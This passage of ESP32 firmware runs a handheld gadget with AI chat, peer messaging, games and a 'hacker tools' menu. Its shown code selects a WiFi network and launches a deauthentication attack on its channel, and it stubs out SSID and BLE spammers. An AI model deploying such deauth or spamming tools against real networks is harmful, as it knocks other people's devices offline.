// ============ TRANSITION SYSTEM ============
void changeState(AppState newState) {
  if (transitionState == TRANSITION_NONE && currentState != newState) {
    transitionTargetState = newState;
    transitionState = TRANSITION_OUT;
    transitionProgress = 0.0f;
    previousState = currentState;
  }
}

// ============ MENU HANDLERS ============
void handleMainMenuSelect() {
  switch(menuSelection) {
    case 0: // AI CHAT
      if (WiFi.status() == WL_CONNECTED) {
        isSelectingMode = true;
        showAIModeSelection(0);
      } else {
        ledError();
        showStatus("WiFi not connected!", 1500);
      }
      break;
    case 1: // WIFI MGR
      menuSelection = 0;
      changeState(STATE_WIFI_MENU);
      break;
    case 2: // ESP-NOW
      menuSelection = 0;
      if (!espnowInitialized) {
        if (initESPNow()) {
          showStatus("ESP-NOW\nInitialized!", 1000);
        } else {
          showStatus("ESP-NOW\nFailed!", 1500);
          return;
        }
      }
      changeState(STATE_ESPNOW_MENU);
      break;
    case 3: // COURIER
      changeState(STATE_TOOL_COURIER);
      break;
    case 4: // SYSTEM
      menuSelection = 0;
      changeState(STATE_SYSTEM_MENU);
      break;
    case 5: // V-PET
      loadPetData();
      changeState(STATE_VPET);
      break;
    case 6: // HACKER
      menuSelection = 0;
      changeState(STATE_HACKER_TOOLS_MENU);
      break;
    case 7: // FILES
      fileListCount = 0; // Force refresh
      changeState(STATE_TOOL_FILE_MANAGER);
      break;
    case 8: // GAME HUB
      menuSelection = 0;
      changeState(STATE_GAME_HUB);
      break;
    case 9: // ABOUT
      changeState(STATE_ABOUT);
      break;
    case 10: // SONAR
      if (WiFi.status() != WL_CONNECTED) {
         showStatus("Connect WiFi\nFirst!", 1000);
         changeState(STATE_WIFI_MENU);
      } else {
         changeState(STATE_TOOL_WIFI_SONAR);
      }
      break;
  }
}

void handleHackerToolsMenuSelect() {
  switch(menuSelection) {
    case 0: // Deauther
      networkCount = 0;
      selectedNetwork = 0;
      scanWiFiNetworks(false);
      changeState(STATE_TOOL_DEAUTH_SELECT);
      break;
    case 1: // Spammer
      changeState(STATE_TOOL_SPAMMER);
      break;
    case 2: // Probe Sniffer
      changeState(STATE_TOOL_PROBE_SNIFFER);
      break;
    case 3: // Packet Monitor
      changeState(STATE_TOOL_SNIFFER);
      break;
    case 4: // BLE Spammer
      changeState(STATE_TOOL_BLE_MENU);
      break;
    case 5: // Deauth Detector
      changeState(STATE_DEAUTH_DETECTOR);
      break;
    case 6: // Back
      menuSelection = 0;
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void drawScaledBitmap(int16_t x, int16_t y, const uint8_t *bitmap, int16_t w, int16_t h, float scale, uint16_t color);
void drawRacingModeSelect();
void handleRacingModeSelect();

void handleRacingModeSelect() {
  switch(menuSelection) {
    case 0: // 1 Player
      raceGameMode = RACE_MODE_SINGLE;
      racingGameActive = false;
      changeState(STATE_GAME_RACING);
      break;
    case 1: // 2 Player
      raceGameMode = RACE_MODE_MULTI;
      racingGameActive = false;
      changeState(STATE_GAME_RACING);
      break;
    case 2: // Back
      menuSelection = 0;
      changeState(STATE_GAME_HUB);
      break;
  }
}

void handleSystemMenuSelect() {
  switch (menuSelection) {
    case 0: // Device Info
      changeState(STATE_SYSTEM_PERF);
      break;
    case 1: // Security
      preferences.begin("app-config", false);
      pinLockEnabled = !pinLockEnabled;
      preferences.putBool("pinLock", pinLockEnabled);
      preferences.end();
      if (!pinLockEnabled) {
        showStatus("PIN Lock Disabled", 1500);
      } else {
        pinInput = "";
        cursorX = 0;
        cursorY = 0;
        changeState(STATE_CHANGE_PIN);
      }
      break;
    case 2: // Back
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void handlePinLockKeyPress() {
  const char* key = keyboardPin[cursorY][cursorX];
  if (strcmp(key, "OK") == 0) {
    if (currentState == STATE_PIN_LOCK) {
      if (pinInput == currentPin) {
        showStatus("Unlocked!", 1000);
        changeState(stateAfterUnlock);
      } else {
        showStatus("Incorrect PIN", 1000);
        pinInput = "";
      }
    } else if (currentState == STATE_CHANGE_PIN) {
      if (pinInput.length() == 4) {
        currentPin = pinInput;
        preferences.begin("app-config", false);
        preferences.putString("pinCode", currentPin);
        preferences.end();
        showStatus("PIN Set!", 1000);
        changeState(STATE_SYSTEM_MENU);
      } else {
        showStatus("PIN must be 4 digits", 1000);
      }
    }
  } else if (strcmp(key, "<") == 0) {
    if (pinInput.length() > 0) {
      pinInput.remove(pinInput.length() - 1);
    }
  } else {
    if (pinInput.length() < 4) {
      pinInput += key;
    }
  }
}


void handleGameHubMenuSelect() {
  switch(menuSelection) {
    case 0:
      menuSelection = 0;
      changeState(STATE_RACING_MODE_SELECT);
      break;
    case 1:
      pongGameActive = false;
      changeState(STATE_GAME_PONG);
      break;
    case 2:
      initSnakeGame();
      changeState(STATE_GAME_SNAKE);
      break;
    case 3:
      changeState(STATE_VIS_STARFIELD);
      break;
    case 4:
      changeState(STATE_VIS_LIFE);
      break;
    case 5:
      changeState(STATE_VIS_FIRE);
      break;
    case 6:
      menuSelection = 0;
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void handleWiFiMenuSelect() {
  switch(menuSelection) {
    case 0:
      menuSelection = 0;
      scanWiFiNetworks();
      break;
    case 1:
      forgetNetwork();
      menuSelection = 0;
      break;
    case 2:
      menuSelection = 0;
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void handleESPNowMenuSelect() {
  switch(menuSelection) {
    case 0:
      changeState(STATE_ESPNOW_CHAT);
      break;
    case 1:
      selectedPeer = 0;
      changeState(STATE_ESPNOW_PEER_SCAN);
      break;
    case 2:
      userInput = myNickname;
      keyboardContext = CONTEXT_ESPNOW_NICKNAME;
      cursorX = 0;
      cursorY = 0;
      currentKeyboardMode = MODE_LOWER;
      changeState(STATE_KEYBOARD);
      break;
    case 3:
      userInput = "";
      keyboardContext = CONTEXT_ESPNOW_ADD_MAC;
      cursorX = 0;
      cursorY = 0;
      currentKeyboardMode = MODE_NUMBERS;
      changeState(STATE_KEYBOARD);
      break;
    case 4:
      chatTheme = (chatTheme + 1) % 3;
      break;
    case 5:
      menuSelection = 0;
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void handleKeyPress() {
  const char* key = getCurrentKey();
  if (strcmp(key, "OK") == 0) {
    if (keyboardContext == CONTEXT_CHAT) {
      if (userInput.length() > 0) {
        sendToGemini();
      }
    } else if (keyboardContext == CONTEXT_ESPNOW_CHAT) {
      if (userInput.length() > 0) {
        sendESPNowMessage(userInput);
        userInput = "";
        changeState(STATE_ESPNOW_CHAT);
      }
    } else if (keyboardContext == CONTEXT_ESPNOW_NICKNAME) {
      if (userInput.length() > 0) {
        myNickname = userInput;
        savePreferenceString("espnow_nick", myNickname);
        showStatus("Nickname\nsaved!", 1000);
        changeState(STATE_ESPNOW_MENU);
      }
    } else if (keyboardContext == CONTEXT_ESPNOW_ADD_MAC) {
      if (userInput.length() == 12 || userInput.length() == 17) {
        // Parse MAC
        uint8_t mac[6];
        int values[6];
        int parsed = 0;
        if (userInput.indexOf(':') != -1) {
           parsed = sscanf(userInput.c_str(), "%x:%x:%x:%x:%x:%x",
                           &values[0], &values[1], &values[2],
                           &values[3], &values[4], &values[5]);
        } else {
           // Handle no colons if user just typed AABBCCDDEEFF
           // This is harder with sscanf but we can split
           if (userInput.length() == 12) {
               char buffer[3];
               buffer[2] = 0;
               parsed = 6;
               for(int i=0; i<6; i++) {
                   buffer[0] = userInput[i*2];
                   buffer[1] = userInput[i*2+1];
                   values[i] = strtol(buffer, NULL, 16);
               }
           }
        }

        if (parsed == 6) {
           for(int i=0; i<6; i++) mac[i] = (uint8_t)values[i];

           bool exists = false;
           for(int i=0; i<espnowPeerCount; i++) {
               if(memcmp(espnowPeers[i].mac, mac, 6) == 0) exists = true;
           }

           if (!exists && espnowPeerCount < MAX_ESPNOW_PEERS) {
              memcpy(espnowPeers[espnowPeerCount].mac, mac, 6);
              espnowPeers[espnowPeerCount].nickname = "Manual Peer";
              espnowPeers[espnowPeerCount].lastSeen = millis();
              espnowPeers[espnowPeerCount].isActive = true;
              espnowPeerCount++;

              esp_now_peer_info_t peerInfo = {};
              memcpy(peerInfo.peer_addr, mac, 6);
              peerInfo.channel = 0;
              peerInfo.encrypt = false;
              esp_now_add_peer(&peerInfo);

              showStatus("Peer Added!", 1000);
              changeState(STATE_ESPNOW_MENU);
           } else {
              showStatus("Exists or Full", 1000);
           }
        } else {
           showStatus("Invalid Format", 1000);
        }
      } else {
         showStatus("Invalid Length", 1000);
      }
    } else if (keyboardContext == CONTEXT_ESPNOW_RENAME_PEER) {
      if (userInput.length() > 0 && selectedPeer < espnowPeerCount) {
         espnowPeers[selectedPeer].nickname = userInput;
         showStatus("Renamed!", 1000);
         changeState(STATE_ESPNOW_PEER_SCAN);
      }
    }
  } else if (strcmp(key, "<") == 0) {
    if (userInput.length() > 0) {
      userInput.remove(userInput.length() - 1);
    }
  } else if (strcmp(key, "#") == 0) {
    toggleKeyboardMode();
  } else {
    if (userInput.length() < 150) {
      userInput += key;
    }
  }
}

void handlePasswordKeyPress() {
  const char* key = getCurrentKey();
  if (strcmp(key, "OK") == 0) {
    connectToWiFi(selectedSSID, passwordInput);
  } else if (strcmp(key, "<") == 0) {
    if (passwordInput.length() > 0) {
      passwordInput.remove(passwordInput.length() - 1);
    }
  } else if (strcmp(key, "#") == 0) {
    toggleKeyboardMode();
  } else {
    passwordInput += key;
  }
}

// ============ REFRESH SCREEN ============
// Di fungsi refreshCurrentScreen(), tambahkan case yang hilang:

// Forward declarations for placeholder functions
void drawSpammer();
void drawProbeSniffer();
void drawBleMenu();
void drawDeauthDetector();

void refreshCurrentScreen() {
  if (isSelectingMode) {
    showAIModeSelection(0);
    return;
  }
  
  int x_offset = 0;
  if (transitionState == TRANSITION_OUT) {
    x_offset = -SCREEN_WIDTH * transitionProgress;
  } else if (transitionState == TRANSITION_IN) {
    x_offset = SCREEN_WIDTH * (1.0 - transitionProgress);
  }
  
  switch(currentState) {
    case STATE_MAIN_MENU:
      showMainMenu(x_offset);
      break;
    case STATE_WIFI_MENU:
      showWiFiMenu(x_offset);
      break;
    case STATE_WIFI_SCAN:
      displayWiFiNetworks(x_offset);
      break;
    case STATE_KEYBOARD:
      drawKeyboard(x_offset);
      break;
    case STATE_PASSWORD_INPUT:
      drawKeyboard(x_offset);
      break;
    case STATE_CHAT_RESPONSE:
      displayResponse();
      break;
    case STATE_LOADING:
      showLoadingAnimation(x_offset);
      break;
    case STATE_SYSTEM_MENU:
      drawSystemMenu();
      break;
    case STATE_SYSTEM_PERF:
      showSystemPerf(x_offset);
      break;
    case STATE_TOOL_COURIER:
      drawCourierTool();
      break;
    case STATE_ESPNOW_CHAT:
      drawESPNowChat();
      break;
    case STATE_ESPNOW_MENU:
      drawESPNowMenu();
      break;
    case STATE_ESPNOW_PEER_SCAN:
      drawESPNowPeerList();
      break;
    case STATE_VPET:
      drawPetGame();
      break;
    case STATE_TOOL_SNIFFER:
      drawSniffer();
      break;
    case STATE_TOOL_NETSCAN:
      drawNetScan();
      break;
    case STATE_TOOL_FILE_MANAGER:
      drawFileManager();
      break;
    case STATE_GAME_HUB:
      drawGameHubMenu();
      break;
    case STATE_HACKER_TOOLS_MENU:
      drawHackerToolsMenu();
      break;
    case STATE_TOOL_DEAUTH_SELECT:
      drawDeauthSelect();
      break;
    case STATE_TOOL_DEAUTH_ATTACK:
      drawDeauthAttack();
      break;
    case STATE_VIS_STARFIELD:
      drawStarfield();
      break;
    case STATE_VIS_LIFE:
      drawGameOfLife();
      break;
    case STATE_VIS_FIRE:
      drawFireEffect();
      break;
    case STATE_GAME_PONG:
      drawPongGame();
      break;
    case STATE_GAME_SNAKE:
      drawSnakeGame();
      break;
    case STATE_GAME_RACING:
      drawRacingGame();
      break;
    case STATE_RACING_MODE_SELECT:
      drawRacingModeSelect();
      break;
    case STATE_ABOUT:
      drawAboutScreen();
      break;
    case STATE_TOOL_WIFI_SONAR:
      drawWiFiSonar();
      break;
    case STATE_TOOL_SPAMMER:
      drawSpammer();
      break;
    case STATE_TOOL_PROBE_SNIFFER:
      drawProbeSniffer();
      break;
    case STATE_TOOL_BLE_MENU:
      drawBleMenu();
      break;
    case STATE_DEAUTH_DETECTOR:
      drawDeauthDetector();
      break;
    case STATE_PIN_LOCK:
      drawPinLock(false);
      break;
    case STATE_CHANGE_PIN:
      drawPinLock(true);
      break;
    default:
      showMainMenu(x_offset);
      break;
  }
}

// Placeholder functions to fix UI freeze
void drawGenericToolScreen(const char* title) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0xF800);
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(10, 18);
  canvas.print(title);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setCursor(50, 80);
  canvas.print("UI Not Implemented");
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("L+R to Go Back");
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawSpammer() {
  drawGenericToolScreen("SSID SPAMMER");
}

void drawProbeSniffer() {
  drawGenericToolScreen("PROBE SNIFFER");
}

void drawBleMenu() {
  drawGenericToolScreen("BLE SPAMMER");
}

void drawDeauthDetector() {
  drawGenericToolScreen("DEAUTH DETECTOR");
}

// ============ SETUP ============
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n");
  Serial.println("========================================");
  Serial.println("===  ESP32-S3 AI DEVICE + ESP-NOW  ===");
  Serial.println("===  Enhanced Memory System v2.1   ===");
  Serial.println("========================================");
  
  setCpuFrequencyMhz(CPU_FREQ);
  Serial.printf("CPU Freq: %d MHz\n", getCpuFrequencyMhz());
  
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  Serial.println("✓ Backlight ON");
  delay(100);
  
  SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
  SPI.setFrequency(40000000);
  Serial.println("✓ SPI Initialized (40MHz)");
  
  tft.init(170, 320);
  Serial.println("✓ TFT init(170, 320)");
  
  tft.setRotation(3);
  Serial.println("✓ Rotation: 3 (Landscape 320x170)");
  
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_WHITE);
  tft.setTextSize(3);
  tft.setCursor(50, 50);
  tft.println("personal desk");
  tft.setTextColor(ST77XX_GREEN);
  tft.setTextSize(2);
  tft.setCursor(70, 90);
  tft.println("ESP-NOW Ready");
  delay(2000);
  
  //

  canvas.setTextWrap(false);
  Serial.println("✓ Canvas initialized");
  
  if (!LittleFS.begin(true)) {
    Serial.println("⚠ LittleFS Mount Failed");
  } else {
    Serial.println("✓ LittleFS Mounted");
  }
  
  pinMode(BTN_SELECT, INPUT);
  pinMode(BTN_UP, INPUT);
  pinMode(BTN_DOWN, INPUT);
  pinMode(BTN_LEFT, INPUT);
  pinMode(BTN_RIGHT, INPUT);
  pinMode(BTN_BACK, INPUT);
  pinMode(TOUCH_LEFT, INPUT);
  pinMode(TOUCH_RIGHT, INPUT);
  pinMode(LED_BUILTIN, OUTPUT);
  Serial.println("✓ Buttons Initialized");
  
  pixels.begin();
  pixels.setPixelColor(0, pixels.Color(255, 255, 255));
  pixels.show();
  Serial.println("✓ NeoPixel: WHITE");
  
  Serial.println("\n--- SD Card Init ---");
  SPI.end();
  SPI.begin(SDCARD_SCK, SDCARD_MISO, SDCARD_MOSI, SDCARD_CS);
  if (SD.begin(SDCARD_CS)) {
    sdCardMounted = true;
    Serial.println("✓ SD Card Mounted");
    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
    Serial.printf("  Card Size: %llu MB\n", cardSize);
    
    if (initSDChatFolder()) {
      Serial.println("\n=== LOADING FULL CHAT HISTORY ===");
      loadChatHistoryFromSD();
      Serial.println("=================================\n");
    }
  } else {
    Serial.println("⚠ SD Card Mount Failed");
  }
  
  SPI.end();
  SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
  SPI.setFrequency(40000000);
  
  loadConfig(); // Load everything

  // showFPS = loadPreferenceBool("showFPS", false);
  // myNickname = loadPreferenceString("espnow_nick", "ESP32");
  // Values are already synced in loadConfig()

  Serial.println("✓ Config Loaded");
  Serial.print("ESP-NOW Nickname: ");
  Serial.println(myNickname);
  
  String savedSSID = loadPreferenceString("ssid", "");
  String savedPassword = loadPreferenceString("password", "");
  if (savedSSID.length() > 0) {
    Serial.print("Connecting to: ");
    Serial.println(savedSSID);
    WiFi.begin(savedSSID.c_str(), savedPassword.c_str());
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      Serial.print(".");
      attempts++;
    }
    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("\n✓ WiFi Connected");
      Serial.print("IP: ");
      Serial.println(WiFi.localIP());
      configTime(25200, 0, "pool.ntp.org", "time.nist.gov");
    } else {
      Serial.println("\n⚠ WiFi Failed");
    }
  }
  
  canvas.fillScreen(COLOR_BG);
  canvas.fillRect(0, 0, SCREEN_WIDTH, 35, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(3);
  canvas.setCursor(50, 8);
  canvas.print("personal desk");
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(70, 60);
  canvas.print("Dual AI + P2P");
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(1);
  canvas.setCursor(60, 90);
  canvas.print("Subaru + Standard AI");
  canvas.setCursor(80, 105);
  canvas.print("ESP-NOW Chat");
  
  if (sdCardMounted && chatMessageCount > 0) {
    canvas.setCursor(60, 125);
    canvas.print("Memory: ");
    canvas.print(chatMessageCount);
    canvas.print(" messages");
  }
  
  canvas.setCursor(80, 145);
  canvas.print("System Ready!");
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
  
  ledSuccess();
  delay(3000);

  preferences.begin("app-config", true);
  pinLockEnabled = preferences.getBool("pinLock", false);
  currentPin = preferences.getString("pinCode", "1234");
  preferences.end();

  if (pinLockEnabled) {
    currentState = STATE_PIN_LOCK;
    stateAfterUnlock = STATE_MAIN_MENU;
    pinInput = "";
    cursorX = 0;
    cursorY = 0;
  } else {
    currentState = STATE_MAIN_MENU;
  }
  
  menuSelection = 0;
  //showMainMenu(0); // This will be called by refreshCurrentScreen
  lastInputTime = millis();
  
  Serial.println("\n========================================");
  Serial.println("===        SETUP COMPLETE!           ===");
  Serial.println("========================================\n");
}

// ============ LOOP ============
void loop() {
  unsigned long currentMillis = millis();
  perfLoopCount++;
  if (currentMillis - perfLastTime >= 1000) {
    perfFPS = perfFrameCount;
    perfLPS = perfLoopCount;
    perfFrameCount = 0;
    perfLoopCount = 0;
    perfLastTime = currentMillis;
  }

  // Calculate Delta Time
  float dt = (currentMillis - lastFrameMillis) / 1000.0f;
  if (dt > 0.1f) dt = 0.1f; // Cap dt to prevent huge jumps
  lastFrameMillis = currentMillis;

  // Animation Logic
  if (currentState == STATE_MAIN_MENU) {
      menuScrollTarget = (float)menuSelection;

      // Lerp (Exponential Smoothing) - No bounce, stable
      // "Tekan sekali langsung geser satu fitur dengan smooth"
      float smoothSpeed = 15.0f;
      float diff = menuScrollTarget - menuScrollCurrent;

      if (abs(diff) < 0.005f) {
          menuScrollCurrent = menuScrollTarget;
      } else {
          menuScrollCurrent += diff * smoothSpeed * dt;
      }
  }

  if (currentState == STATE_ESPNOW_CHAT && chatAnimProgress < 1.0f) {
      chatAnimProgress += 2.0f * dt; // Fast animation
      if (chatAnimProgress > 1.0f) chatAnimProgress = 1.0f;
  }

  updateNeoPixel();
  updateStatusBarData();
  
  if (currentState == STATE_LOADING) {
    if (currentMillis - lastLoadingUpdate > 100) {
      lastLoadingUpdate = currentMillis;
      loadingFrame = (loadingFrame + 1) % 8;
      showLoadingAnimation(0);
    }
  }
  
  if (transitionState != TRANSITION_NONE) {
    transitionProgress += transitionSpeed * dt;
    if (transitionProgress >= 1.0f) {
      transitionProgress = 1.0f;
      if (transitionState == TRANSITION_OUT) {
        currentState = transitionTargetState;
        transitionState = TRANSITION_IN;
        transitionProgress = 0.0f;
      } else {
        transitionState = TRANSITION_NONE;
      }
    }
  }
  
  if (currentMillis - lastUiUpdate > uiFrameDelay) {
    lastUiUpdate = currentMillis;
    perfFrameCount++;
    refreshCurrentScreen();
  }
  
  // Attack loop needs to run outside of throttled UI updates
  if (currentState == STATE_TOOL_DEAUTH_ATTACK) {
    updateDeauthAttack();
  }

  if (currentState == STATE_GAME_PONG) {
    updatePongLogic();
  }

  if (currentState == STATE_GAME_RACING) {
    updateRacingLogic();
  }

  if (currentState == STATE_GAME_SNAKE) {
    updateSnakeLogic();
  }

  if (transitionState == TRANSITION_NONE && currentMillis - lastDebounce > debounceDelay) {
    bool buttonPressed = false;

    if (currentState == STATE_GAME_PONG) {
      float paddleSpeed = 250.0f * dt;
      if (digitalRead(BTN_UP) == BTN_ACT) {
        player1.y = max(0.0f, player1.y - paddleSpeed);
      }
      if (digitalRead(BTN_DOWN) == BTN_ACT) {
        player1.y = min(SCREEN_HEIGHT - 40.0f, player1.y + paddleSpeed);
      }
      if (digitalRead(BTN_LEFT) == BTN_ACT && digitalRead(BTN_RIGHT) == BTN_ACT) {
        changeState(STATE_GAME_HUB);
      }
    }

    if (currentState == STATE_GAME_SNAKE) {
      if (digitalRead(BTN_UP) == BTN_ACT && snakeDir != SNAKE_DOWN) snakeDir = SNAKE_UP;
      if (digitalRead(BTN_DOWN) == BTN_ACT && snakeDir != SNAKE_UP) snakeDir = SNAKE_DOWN;
      if (digitalRead(BTN_LEFT) == BTN_ACT && snakeDir != SNAKE_RIGHT) snakeDir = SNAKE_LEFT;
      if (digitalRead(BTN_RIGHT) == BTN_ACT && snakeDir != SNAKE_LEFT) snakeDir = SNAKE_RIGHT;
      if (digitalRead(BTN_LEFT) == BTN_ACT && digitalRead(BTN_RIGHT) == BTN_ACT) {
        changeState(STATE_GAME_HUB);
      }
    }
    
    if (isSelectingMode) {
      if (digitalRead(BTN_UP) == BTN_ACT) {
        currentAIMode = MODE_SUBARU;
        showAIModeSelection(0);
        buttonPressed = true;
      }
      if (digitalRead(BTN_DOWN) == BTN_ACT) {
        currentAIMode = MODE_STANDARD;
        showAIModeSelection(0);
        buttonPressed = true;
      }
      if (digitalRead(BTN_SELECT) == BTN_ACT) {
        isSelectingMode = false;
        userInput = "";
        keyboardContext = CONTEXT_CHAT;
        cursorX = 0;
        cursorY = 0;
        currentKeyboardMode = MODE_LOWER;
        changeState(STATE_KEYBOARD);
        buttonPressed = true;
      }
      if (digitalRead(BTN_LEFT) == BTN_ACT && digitalRead(BTN_RIGHT) == BTN_ACT) {
        isSelectingMode = false;
        buttonPressed = true;
      }
      
      if (buttonPressed) {
        lastDebounce = currentMillis;
        lastInputTime = currentMillis;
        ledQuickFlash();
      }
      return;
    }
    
    if (digitalRead(BTN_UP) == BTN_ACT) {
      switch(currentState) {
        case STATE_PIN_LOCK:
        case STATE_CHANGE_PIN:
          cursorY = (cursorY > 0) ? cursorY - 1 : 3;
          break;
        case STATE_MAIN_MENU:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_HACKER_TOOLS_MENU:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_SYSTEM_MENU:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_WIFI_MENU:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_ESPNOW_MENU:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_WIFI_SCAN:
          if (selectedNetwork > 0) {
            selectedNetwork--;
            if (selectedNetwork < wifiPage * wifiPerPage) wifiPage--;
          }
          break;
        case STATE_ESPNOW_PEER_SCAN:
          if (selectedPeer > 0) selectedPeer--;
          break;
        case STATE_KEYBOARD:
        case STATE_PASSWORD_INPUT:
          cursorY--;
          if (cursorY < 0) cursorY = 2;
          break;
        case STATE_CHAT_RESPONSE:
          if (scrollOffset > 0) scrollOffset -= 10;
          break;
        case STATE_VPET:
          // Vertical layout isn't used for V-Pet menu, left/right is used
          break;
        case STATE_TOOL_FILE_MANAGER:
          if (fileListSelection > 0) {
              fileListSelection--;
              if (fileListSelection < fileListScroll) fileListScroll = fileListSelection;
          }
          break;
        case STATE_GAME_HUB:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_ESPNOW_CHAT:
          espnowAutoScroll = false;
          if (espnowScrollIndex > 0) espnowScrollIndex--;
          break;
        default: break;
      }
      buttonPressed = true;
    }
    
    if (digitalRead(BTN_DOWN) == BTN_ACT) {
      switch(currentState) {
        case STATE_PIN_LOCK:
        case STATE_CHANGE_PIN:
          cursorY = (cursorY < 3) ? cursorY + 1 : 0;
          break;
        case STATE_MAIN_MENU:
          if (menuSelection < 10) menuSelection++;
          break;
        case STATE_HACKER_TOOLS_MENU:
          if (menuSelection < 6) menuSelection++;
          break;
        case STATE_SYSTEM_MENU:
          if (menuSelection < 2) menuSelection++;
          break;
        case STATE_TOOL_DEAUTH_SELECT:
          if (selectedNetwork < networkCount - 1) selectedNetwork++;
          break;
        case STATE_WIFI_MENU:
          if (menuSelection < 2) menuSelection++;
          break;
        case STATE_ESPNOW_MENU:
          if (menuSelection < 5) menuSelection++;
          break;
        case STATE_WIFI_SCAN:
          if (selectedNetwork < networkCount - 1) {
            selectedNetwork++;
            if (selectedNetwork >= (wifiPage + 1) * wifiPerPage) wifiPage++;
          }
          break;
        case STATE_ESPNOW_PEER_SCAN:
          if (selectedPeer < espnowPeerCount - 1) selectedPeer++;
          break;
        case STATE_KEYBOARD:
        case STATE_PASSWORD_INPUT:
          cursorY++;
          if (cursorY > 2) cursorY = 0;
          break;
        case STATE_CHAT_RESPONSE:
          scrollOffset += 10;
          break;
        case STATE_TOOL_FILE_MANAGER:
          if (fileListSelection < fileListCount - 1) {
              fileListSelection++;
              if (fileListSelection >= fileListScroll + 5) fileListScroll++;
          }
          break;
        case STATE_GAME_HUB:
          if (menuSelection < 5) menuSelection++;
          break;
        case STATE_ESPNOW_CHAT:
          if (espnowScrollIndex < espnowMessageCount - 1) {
              espnowScrollIndex++;
              if (espnowScrollIndex >= espnowMessageCount - 4) espnowAutoScroll = true;
          }
          break;
        default: break;
      }
      buttonPressed = true;
    }
    
    if (digitalRead(BTN_LEFT) == BTN_ACT) {
      switch(currentState) {
        case STATE_PIN_LOCK:
        case STATE_CHANGE_PIN:
          cursorX = (cursorX > 0) ? cursorX - 1 : 2;
          break;
        case STATE_MAIN_MENU:
          if (menuSelection > 0) menuSelection--;
          break;
        case STATE_KEYBOARD:
        case STATE_PASSWORD_INPUT:
          cursorX--;
          if (cursorX < 0) cursorX = 9;
          break;
        case STATE_ESPNOW_CHAT:
          espnowBroadcastMode = !espnowBroadcastMode;
          showStatus(espnowBroadcastMode ? "Broadcast\nMode" : "Direct\nMode", 800);
          break;
        case STATE_VPET:
          if (petMenuSelection > 0) petMenuSelection--;
          break;
        case STATE_ESPNOW_PEER_SCAN:
          if (espnowPeerCount > 0) {
             userInput = espnowPeers[selectedPeer].nickname;
             keyboardContext = CONTEXT_ESPNOW_RENAME_PEER;
             cursorX = 0;
             cursorY = 0;
             currentKeyboardMode = MODE_LOWER;
             changeState(STATE_KEYBOARD);
          }
          break;
        default: break;
      }
      buttonPressed = true;
    }
    
    if (digitalRead(BTN_RIGHT) == BTN_ACT) {
      switch(currentState) {
        case STATE_PIN_LOCK:
        case STATE_CHANGE_PIN:
          cursorX = (cursorX < 2) ? cursorX + 1 : 0;
          break;
        case STATE_MAIN_MENU:
          if (menuSelection < 10) menuSelection++;
          break;
        case STATE_KEYBOARD:
        case STATE_PASSWORD_INPUT:
          cursorX++;
          if (cursorX > 9) cursorX = 0;
          break;
        case STATE_ESPNOW_CHAT:
          espnowBroadcastMode = !espnowBroadcastMode;
          showStatus(espnowBroadcastMode ? "Broadcast\nMode" : "Direct\nMode", 800);
          break;
        case STATE_VPET:
          if (petMenuSelection < 4) petMenuSelection++;
          break;
        case STATE_TOOL_FILE_MANAGER:
           // Removed horizontal scroll for file manager, moved to vertical
           break;
        default: break;
      }
      buttonPressed = true;
    }
    
    if (digitalRead(BTN_SELECT) == BTN_ACT) {
      switch(currentState) {
        case STATE_MAIN_MENU:
          handleMainMenuSelect();
          break;
        case STATE_PIN_LOCK:
        case STATE_CHANGE_PIN:
          handlePinLockKeyPress();
          break;
        case STATE_SYSTEM_MENU:
          handleSystemMenuSelect();
          break;
        case STATE_HACKER_TOOLS_MENU:
          handleHackerToolsMenuSelect();
          break;
        case STATE_RACING_MODE_SELECT:
          handleRacingModeSelect();
          break;
        case STATE_TOOL_DEAUTH_SELECT:
          if (networkCount > 0) {
            deauthTargetSSID = networks[selectedNetwork].ssid;
            memcpy(deauthTargetBSSID, networks[selectedNetwork].bssid, 6);
            int channel = networks[selectedNetwork].channel;

            showStatus("Preparing...", 500);
            WiFi.disconnect();
            WiFi.mode(WIFI_AP_STA);
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            showStatus("Attacking on Ch: " + String(channel), 1000);

            deauthPacketsSent = 0;
            deauthAttackActive = true;
            changeState(STATE_TOOL_DEAUTH_ATTACK);
          }
          break;
        case STATE_GAME_HUB:
          handleGameHubMenuSelect();
          break;
        case STATE_TOOL_SNIFFER:
          // Toggle active/passive or just reset stats
          snifferPacketCount = 0;
          memset(snifferHistory, 0, sizeof(snifferHistory));
          showStatus("Reset Sniffer", 500);
          break;
        case STATE_TOOL_NETSCAN:
          scanWiFiNetworks();
          break;
        case STATE_TOOL_FILE_MANAGER:
          // Simple selection feedback
